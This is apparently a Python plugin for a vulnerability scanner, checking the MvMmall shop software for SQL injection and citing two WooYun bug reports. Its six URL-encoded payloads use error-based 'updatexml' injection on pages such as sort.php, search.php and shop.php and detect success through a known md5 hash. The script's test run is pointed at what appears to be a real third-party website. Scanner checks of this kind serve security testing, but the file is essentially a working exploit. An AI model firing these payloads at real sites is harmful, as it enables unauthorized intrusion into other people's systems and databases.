#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2010-0107074
#ref http://www.wooyun.org/bugs/wooyun-2010-0107090
def assign(service, arg):
    if service == "mvmmall":
        return True, arg


def audit(arg):
    payloads = ['miaosha.php?action=&cat_uid=&brand_uid=30%20OR%20updatexml%281%2CCONCAT%280x7e%2Cmd5%280x22%29%29%2C0%29',\
    'sort.php?shop_name=%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',\
    'page.php?action=%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',\
    'board.php?ps_search=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',\
    'search.php?ps_search=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27&sellshow=1',\
    'shop.php?shop_name=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29%20or%27']
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if 'b15835f133ff2e27c7cb28117bfae8f' in res:
            security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    
    audit(assign('mvmmall', 'http://www.sqyigou.com/')[1])